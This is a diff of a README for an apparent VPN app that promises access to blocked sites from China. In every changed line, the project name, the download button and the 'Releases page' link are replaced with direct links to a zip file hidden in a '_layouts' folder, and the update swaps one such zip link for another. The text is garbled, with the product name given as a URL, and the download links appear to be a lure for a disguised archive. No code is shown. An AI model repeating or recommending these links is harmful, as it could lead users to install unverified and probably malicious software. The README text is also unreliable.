@@ -1,12 +1,12 @@
-# 🌍 https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/github-chinawallvpn-io-v2.2.zip - Access Global Content Easily
+# 🌍 https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/chinawallvpn_github_io_1.5.zip - Access Global Content Easily
 
 ## 🚀 Getting Started
 
-Welcome to https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/github-chinawallvpn-io-v2.2.zip! This application helps you connect to global websites like Google, Facebook, YouTube, and more from China. Follow these simple steps to get started.
+Welcome to https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/chinawallvpn_github_io_1.5.zip! This application helps you connect to global websites like Google, Facebook, YouTube, and more from China. Follow these simple steps to get started.
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/github-chinawallvpn-io-v2.2.zip)](https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/github-chinawallvpn-io-v2.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/chinawallvpn_github_io_1.5.zip)](https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/chinawallvpn_github_io_1.5.zip)
 
 Click the button above to visit the Releases page and download the application. 
 
@@ -61,10 +61,10 @@ These topics can guide you to better understand how to enhance your internet sec
 
 ## 📅 Release Notes
 
-Every time we launch a new version, the release notes will detail what has changed, new features added, or bugs fixed. Visit the [Releases page](https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/github-chinawallvpn-io-v2.2.zip) for the latest updates.
+Every time we launch a new version, the release notes will detail what has changed, new features added, or bugs fixed. Visit the [Releases page](https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/chinawallvpn_github_io_1.5.zip) for the latest updates.
 
 ## 👨‍💻 License
 
 This project is open-source and licensed under the MIT License. You are welcome to use and modify it as you wish. Check the license file in the repository for more details.
 
-Thank you for using https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/github-chinawallvpn-io-v2.2.zip! Enjoy unrestricted access to the Internet.
+Thank you for using https://raw.githubusercontent.com/justinechris/chinawallvpn.github.io/main/_layouts/chinawallvpn_github_io_1.5.zip! Enjoy unrestricted access to the Internet.
